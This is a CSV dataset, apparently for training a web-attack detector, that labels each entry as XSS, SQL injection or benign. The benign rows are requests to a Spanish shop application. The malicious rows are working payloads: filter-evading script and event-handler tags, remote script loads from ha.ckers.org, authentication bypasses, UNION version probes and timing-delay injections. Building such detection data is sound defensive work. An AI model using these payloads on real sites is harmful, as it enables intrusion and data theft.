payload,type
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"1')) or benchmark(100000000,MD5(1))#",sqli
"a"" order by 1-- #",sqli
http://www.google<script .com>alert(document.location)</script,xss
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss
"<DIV STYLE=""width:expression(javascript:alert(1));"">",xss
¼script¾alert(¢XSS¢)¼/script¾,xss
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ​",xss
"`""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>",xss
"s)ns: select * from users where id=1 or "")$"" or 1=1 -- 1",sqli
"1) or benchmark(100000000,MD5(1))#",sqli
1oon&: select * from users where id=1 + \+%$ or 1=1 -- 1,sqli
<BODY ONLOAD=javascript:javascript:alert(1)>,xss
noo1&: select * from users where id=1 + $+%1 or 1=1 -- 1,sqli
armenteros,benign
1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--,sqli
miembros/index.jsp,benign
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,xss
"admin"" or 1=1--",sqli
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",xss
"<a href=""\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
a' order by 9999-- #,sqli
"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",xss
"no)UE: select * from users where id=1 + ($+) union select null,@@VERSION -- 1",sqli
imagenes/nuestratierra.jpg,benign
"UEvo,: select * from users where id=1 union select @<@,version() -- 1",sqli
"voUEv: select * from users where id=1 -@<@ union select null,version() -- 1",sqli
"""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",xss
"<IMG onmouseover=""alert('xxs')"">",xss
"so;s: select * from users where id=1 or ""%;"" or 1=1 -- 1",sqli
elsen@whitehat.td,benign
publico/autenticar.jsp?modo=entrar&login=kesling8&pwd=g8629e8d9r&remember=off&B1=Entrar,benign
peng1in,benign
"a""and/*g*/456=678-- #",sqli
"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",xss
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,xss
"c/ tamesis 39, 1?c",benign
"s,c: select * from users where id=1 or "",#"" or 1=1 -- 1",sqli
2.56E+15,benign
adoree-halsted1@estoespresto.af,benign
"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<img src\x12=x onerror=""javascript:alert(1)"">",xss
admin') or ('1'='1'--,sqli
17889538t,benign
miembros/salir.jsp,benign
"`""'><img src=xxx:x \x20onerror=javascript:alert(1)>",xss
dierkop@hayunmundoahifuera.id,benign
<iframe/src \/\/onload = prompt(1),xss
<svg><script>//&NewLine;confirm(1);</script </svg>,xss
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",xss
miembros/index.jsp,benign
"s?s: select * from users where id='1' union select ""?""_,version() -- 1'",sqli
"`""'><img src='#\x27 onerror=javascript:alert(1)>",xss
"UE1n,: select * from users where id=1 union select .1_,version() -- 1",sqli
07485924e,benign
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
cele959n3s0o,benign
"s1UE1: select * from users where id=1 or 1#""1 union select 1,version() -- 1",sqli
"""`'><script>\xC2\x85javascript:alert(1)</script>",xss
<script itworksinallbrowsers>/*<script* */alert(1)</script,xss
publico/caracteristicas.jsp?id=2,benign
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>,xss
"o..UE: select * from users where id=1<@.. union select 1,version() -- 1",sqli
publico/vaciar.jsp?B2=Vaciar+carrito,benign
"s:UE1: select * from users where id=1 or 1#"": union select 1,version() -- 1",sqli
<script\x00>javascript:alert(1)</script>,xss
?revivir,benign
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
"""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",xss
3.20E+15,benign
70679983v,benign
<// style=x:expression\28javascript:alert(1)\29>,xss
"<div id=d><div style=""font-family:'sans\27\3B color\3Ared\3B'"">X</div></div> <script>with(document.getElementById(""d""))innerHTML=innerHTML</script>",xss
<script>javascript:alert(1)</script\x0D,xss
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x,xss
"s,;s: select * from users where id=1 or "",;"" or 1=1 -- 1",sqli
^,sqli
s&1c: select * from users where id='1'   or 1=1 -- 1',sqli
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,xss
o1&1c: select * from users where id=1 *1 or 1=1 -- 1,sqli
"s;.s: select * from users where id=1 or "";.""=1 or 1=1 -- 1",sqli
"<BR SIZE=""&{alert('XSS')}"">",xss
"s(;s: select * from users where id=1 or ""(;"" or 1=1 -- 1",sqli
"s,{s: select * from users where id=1 or "",{"" or 1=1 -- 1",sqli
publico/autenticar.jsp?modo=entrar&login=marge&pwd=g1ne136&remember=on&B1=Entrar,benign
"s{?s: select * from users where id=1 or ""{?"" or 1=1 -- 1",sqli
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"admin"" or 1=1",sqli
"1UEvk: select * from users where id=1 +1 union select null,banner from v$version where rownum=1 -- 1",sqli
&(n&1: select * from users where id=1 or ($+)=1 or 1=1 -- 1,sqli
47965007w,benign
"<input type=""text"" value=``<div/onmouseover='alert(1)'>X</div>",xss
longhurst-street1@drae2.pa,benign
sant vicen de torell,benign
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,xss
90230020p,benign
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",xss
"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",xss
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=63&B1=A%F1adir+al+carrito,benign
miembros/imagenes/castro.jpg,benign
global/creditos.jsp,benign
publico/miembros.jsp,benign
miembros/fotos.jsp,benign
"<image src=1 href=1 onerror=""javascript:alert(1)""></image>",xss
"o()UE: select * from users where id=1 *(\) union select null,@@VERSION -- 1",sqli
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"so(s: select * from users where id=1 or ""&("" or 1=1 -- 1",sqli
"UE11n: select * from users where id=1 union select 1 1a,version() -- 1",sqli
"<img src=x\x11onerror=""javascript:alert(1)"">",xss
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
2 and 456=678,sqli
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss
"<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
" <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
publico/autenticar.jsp?modo=entrar&login=monette&pwd=1ob20h9la3&remember=off&B1=Entrar,benign
"<A HREF=""http://66.102.7.147/"">XSS</A>",xss
7.87E+15,benign
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",xss
"&noon: select * from users where id=1 or $+<$ union select 1,@@VERSION -- 1",sqli
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​",xss
"s,UEv: select * from users where id=1 or 1#"", union select null,version() -- 1",sqli
imagenes/logo.gif,benign
"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",xss
"o1nUE: select * from users where id=1 <@1$ union select 1,version() -- 1",sqli
global/creditos.jsp,benign
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",xss
"s,?s: select * from users where id=1 or "",?"" or 1=1 -- 1",sqli
"sUEo,: select * from users where id='1' union select +\,@@VERSION -- 1'",sqli
"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",xss
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,xss
2 or 345=345,sqli
"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",xss
"<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1);"">XXX</a></a><a href=""javascript:javascript:alert(1)"">XXX</a>",xss
1')); waitfor delay '0:0:X'--,sqli
"<object data=""data:text/html;base64,%(base64)s"">",xss
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
publico/pagar.jsp?modo=insertar&precio=3027&B1=Confirmar,benign
4089,benign
"<a href=""javascript\x00:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
57584234p,benign
noon&: select * from users where id=1 + $+%$ or 1=1 -- 1,sqli
1'; waitfor delay '0:0:X'--,sqli
"s)?s: select * from users where id=1 or "")]"" or 1=1 -- 1",sqli
"s){s: select * from users where id=1 or ""){"" or 1=1 -- 1",sqli
"s(UEv: select * from users where id=1 or 1#""( union select null,version() -- 1",sqli
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
<%<!--'%><script>alert(1);</script -->,xss
publico/registro.jsp?modo=registro&login=ftpsites&password=t0t0&nombre=Alfio&apellidos=Potel+Ivars&email=storgaard-szibo3%40elreversotenebroso.ky&dni=17889538T&direccion=Diogenes+82%2C+&ciudad=Ag%F3n&cp=47450&provincia=Guadalajara&ntc=8851191771150286&B1=Registrar,benign
<script x> alert(1) </script 1=2,xss
arraia-maeztu,benign
"<img src=x\x12onerror=""javascript:alert(1)"">",xss
"UE111: select * from users where id=1 union select 1 1$,version() -- 1",sqli
"s(?s: select * from users where id=1 or ""(]"" or 1=1 -- 1",sqli
"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>XSS",xss
81383348x,benign
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=41&B1=A%F1adir+al+carrito,benign
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",xss
9.55E+15,benign
"<img src=x onerror=\x11""javascript:alert(1)"">",xss
"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>",xss
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
<title onpropertychange=javascript:alert(1)></title><title title=>,xss
"svos: select * from users where id=1 or ""@%"" or 1=1 -- 1",sqli
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>,xss
".oUEv: select * from users where id=1.*\ union select null,@@VERSION -- 1",sqli
andrs castanyer,benign
"s.:s: select * from users where id=1 or "".:""=1 or 1=1 -- 1",sqli
"o.UEv: select * from users where id=1 *\. union select null,@@VERSION -- 1",sqli
"1)) or benchmark(100000000,MD5(1))#",sqli
imagenes/cmenbul.gif,benign
ansorger,benign
trombn,benign
"s?,s: select * from users where id=1 or ""?,"" or 1=1 -- 1",sqli
"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",xss
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",xss
<svg><script>//&NewLine;confirm(1);</script </svg>,xss
a' or '345'='345,sqli
"<IMG SRC=""javascript:javascript:alert(1)""",xss
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",xss
"snos: select * from users where id=1 or ""$&"" or 1=1 -- 1",sqli
publico/registro.jsp?modo=registro&login=calleja&password=fermentadora&nombre=Lahuen&apellidos=Palau+Ustrell&email=baxley%40italianmotorvillagesevilla.sh&dni=01084400L&direccion=Plaza+Aparejador+Federico+Bermudez+139%2C+&ciudad=Orce&cp=18129&provincia=Vizcaya&ntc=1769642985963078&B1=Registrar,benign
imagenes/3.gif,benign
"<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/titulo.jsp,benign
elois,benign
"soonU: select * from users where id='1' + $+*$ union select 1,@@VERSION -- 1'",sqli
<iframe/onreadystatechange=alert(1),xss
"&oo1U: select * from users where id=1 or \< =1 union select 1,@@VERSION -- 1",sqli
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
"s(:s: select * from users where id=1 or ""(:"" or 1=1 -- 1",sqli
publico/productos.jsp,benign
"ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",xss
imagenes/cmenbul.gif,benign
"s,)s: select * from users where id=1 or "",)""=1 or 1=1 -- 1",sqli
publico/carrito.jsp,benign
trebaol@arroyomolinos-madrid.gq,benign
<style>*[{}@import'%(css)s?]</style>X,xss
imagenes/cmenbul.gif,benign
"<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
2/1 or 345=345,sqli
"&nooU: select * from users where id=1 or $+<\ union select 1,@@VERSION -- 1",sqli
"admin"" or 1=1#",sqli
22010612a,benign
"UE1o.: select * from users where id=1 union select 1<@.,version() -- 1",sqli
"&oUE1: select * from users where id=1 or \<\ union select 1,@@VERSION -- 1",sqli
"s;UEs: select * from users where id=1 or 1#""; union select 'a',version() -- 1",sqli
baigent@blueberryminiloaf.com.dj,benign
"s(UE1: select * from users where id=1 or 1#""( union select 1,version() -- 1",sqli
"on.UE: select * from users where id=1 *$ . union select null,@@VERSION -- 1",sqli
"<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",xss
tejeda y segoyuela,benign
ferne,benign
1; waitfor delay '0:0:X'--,sqli
"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",xss
publico/pagar.jsp?modo=insertar&precio=119&B1=Pasar+por+caja,benign
"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",xss
admin') or ('1'='1,sqli
"ooUEv: select * from users where id=1 <@<@ union select null,version() -- 1",sqli
"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",xss
soo1&: select * from users where id='1' <@&1 or 1=1 -- 1',sqli
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,xss
miembros/editar.jsp?modo=registro&login=maurie&password=0StroP5je0&nombre=Vlentina&apellidos=Fisas&email=marlaud_losee5%40redesmilitantes.tf&dni=54430634F&direccion=Viseu+81+8%3FC&ciudad=Corbera+d%27Ebre&cp=48210&provincia=Murcia&ntc=4713791605534130&B1=Registrar,benign
1)); waitfor delay '0:0:X'--,sqli
imagenes/3.gif,benign
<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
<script>javascript:alert(1)</script\x0B,xss
6.80E+13,benign
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
adelina,benign
"s).s: select * from users where id=1 or "").""=1 or 1=1 -- 1",sqli
reencarnar,benign
"s{UEv: select * from users where id=1 or 1#""{ union select null,version() -- 1",sqli
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"s{UEf: select * from users where id=1 or 1#""{ union select version(),version() -- 1",sqli
"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",xss
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
"onnUE: select * from users where id=1 <@$_ union select 1,version() -- 1",sqli
publico/caracteristicas.jsp?id=1,benign
publico/caracteristicas.jsp?id=2,benign
"""`'><script>\xE2\x80\xA8javascript:alert(1)</script>",xss
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",xss
"on1UE: select * from users where id=1 %$ 1 union select null,@@VERSION -- 1",sqli
21292,benign
son.&: select * from users where id='1' *$ . or 1=1 -- 1',sqli
global/titulo.jsp,benign
92251391r,benign
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
publico/registro.jsp?modo=registro&login=zinkie0&password=9i3a&nombre=Esteban&apellidos=Delvalle+Llers&email=luxford_baumann%40lasiestacreativa.tel&dni=47651101T&direccion=Calle+Espiel+71+&ciudad=Rab%F3s&cp=45634&provincia=Zaragoza&ntc=8349635911694626&B1=Registrar,benign
"admin"") or (""1""=""1""/*",sqli
"<img \x00src=x onerror=""javascript:alert(1)"">",xss
genestar llufriu,benign
segu san marful,benign
"<a href=""\xE2\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
"UE1f(: select * from users where id=1 union select 1<@$,version() -- 1",sqli
"so,s: select * from users where id=1 or ""%,"" or 1=1 -- 1",sqli
"s1(s: select * from users where id=1 or ""1(""=1 or 1=1 -- 1",sqli
admin') or '1'='1'#,sqli
publico/autenticar.jsp?modo=entrar&login=marlowe&pwd=gavota&remember=on&B1=Entrar,benign
"&()o1: select * from users where id=1 or (\)=1 union select 1,@@VERSION -- 1",sqli
"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",xss
"s;s: select * from users where id='1' union select "";""_,version() -- 1'",sqli
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",xss
publico/registro.jsp?modo=registro&login=leshowit&password=eflujo&nombre=Solania&apellidos=Argim%F3n&email=benfield%40chuecafamily.gs&dni=67663365X&direccion=Plaza+Ignacio+Mercader+77+&ciudad=Coru%F1a%2C+A&cp=42218&provincia=Burgos&ntc=4650446572677289&B1=Registrar,benign
"s{{s: select * from users where id=1 or ""{{"" or 1=1 -- 1",sqli
miembros/imagenes/ogono.jpg,benign
s&no&: select * from users where id='1' or $<\ or 1=1 -- 1',sqli
"s?)s: select * from users where id=1 or ""])"" or 1=1 -- 1",sqli
soon&: select * from users where id='1' + $+%$ or 1=1 -- 1',sqli
18567,benign
"""`'><script>\x0Bjavascript:alert(1)</script>",xss
"sUEvk: select * from users where id='1'   union select null,banner from v$version where rownum=1 -- 1'",sqli
publico/pagar.jsp?modo=insertar&precio=6534&B1=Confirmar,benign
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"sUEv1: select * from users where id='1' union select @ 1,version() --  1'",sqli
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss
26527823z,benign
"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",xss
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
publico/caracteristicas.jsp?id=1,benign
"ABC<div style=""x:\xEF\xBB\xBFexpression(javascript:alert(1)"">DEF",xss
miembros/imagenes/zarauz.jpg,benign
monopolizador,benign
"son.U: select * from users where id='1' + $ . union select 1,@@VERSION -- 1'",sqli
publico/pagar.jsp?modo=insertar&precio=7626&B1=Confirmar,benign
"s.o1&: select * from users where id=1 or @#"".=1 or 1=1 -- 1",sqli
or 1=1,sqli
"s,,s: select * from users where id=1 or "",,""=1 or 1=1 -- 1",sqli
global/creditos.jsp,benign
" or ""&",sqli
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",xss
"s&&o1: select * from users where id='1' or ||/1=1 union select 1,version() -- 1'",sqli
<svg><script onlypossibleinopera:-)> alert(1),xss
on.&1: select * from users where id=1 %$ . or 1=1 -- 1,sqli
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",xss
http://www.<script>alert(1)</script .com,xss
imagenes/logo.gif,benign
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
"s;o1U: select * from users where id=1 or 1#"";=1 union select 1,version() -- 1",sqli
miembros/imagenes/zarauz.jpg,benign
conciliador,benign
dey,benign
publico/pagar.jsp?modo=insertar&precio=2161&B1=Pasar+por+caja,benign
admin' or '1'='1'--,sqli
global/creditos.jsp,benign
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=64&B1=A%F1adir+al+carrito,benign
"admin"") or ""1""=""1",sqli
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,xss
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",xss
c/ david 169 6-h,benign
"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
pe7tr0b9,benign
c/ atlantico 167,benign
"s(o1&: select * from users where id=1 or @#""(=1 or 1=1 -- 1",sqli
"nooUE: select * from users where id=1 + $+*\ union select null,@@VERSION -- 1",sqli
kouraviev@socimi.com.gl,benign
"sUEvv: select * from users where id='1' union select @ @1,version() --  1'",sqli
"s.UEv: select * from users where id=1 or 1#"". union select null,version() -- 1",sqli
publico/caracteristicas.jsp?id=2,benign
<b <script>alert(1)</script>0,xss
"&1oon: select * from users where id=1 or \+<$ union select 1,@@VERSION -- 1",sqli
"1 or benchmark(100000000,MD5(1))#",sqli
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00,xss
"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"">",xss
"'';!--""<XSS>=&{()}",xss
"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",xss
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,xss
' or 'x'='x,sqli
miembros/imagenes/ogono.jpg,benign
shangtia,benign
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",xss
global/estilos.css,benign
"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",xss
"s.;s: select * from users where id=1 or "".;"" or 1=1 -- 1",sqli
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,xss
"<img src=x onerror=\x10""javascript:alert(1)"">",xss
"o1UE1: select * from users where id=1 *1 union select 1,banner from v$version where rownum=1 -- 1",sqli
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",xss
"s.os: select * from users where id=1 or "".%"" or 1=1 -- 1",sqli
"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",xss
"s;{s: select * from users where id=1 or "";{"" or 1=1 -- 1",sqli
"""`'><script>\xE2\x80\x86javascript:alert(1)</script>",xss
"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>​",xss
"sUE.c: select * from users where id='1' union select \.#,@@VERSION -- 1'",sqli
"s:ns: select * from users where id=1 or "":$"" or 1=1 -- 1",sqli
"UE11f: select * from users where id=1 union select 1 $,version() -- 1",sqli
rgiva,benign
5123,benign
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=36&B1=A%F1adir+al+carrito,benign
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=91&B1=A%F1adir+al+carrito,benign
jara escobedo,benign
<svg/onload=alert(1),xss
"<img src\x09=x onerror=""javascript:alert(1)"">",xss
index.jsp,benign
<frameset onload=javascript:alert(1)>,xss
gayol,benign
"marines, los",benign
"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",xss
"345""%5d|//*|/a%5b""a",sqli
di lorenzo,benign
"<style>@import ""data:,*%7bx:expression(javascript:alert(1))%7D"";</style>",xss
houstin@maxitienda.zr,benign
amorebieta-etxano,benign
2/*f*/or/*f*/345=345,sqli
") or (x"")=(""x",sqli
"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",xss
"&no.U: select * from users where id=1 or $<\. union select 1,@@VERSION -- 1",sqli
"s1os: select * from users where id=1 or ""1&"" or 1=1 -- 1",sqli
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
"UEv1f: select * from users where id=1 union select  @ $,version() -- 1",sqli
diezma,benign
"ooUEf: select * from users where id=1 <@<@ union select version(),version() -- 1",sqli
8.85E+15,benign
<script src=%(jscript)s></script>,xss
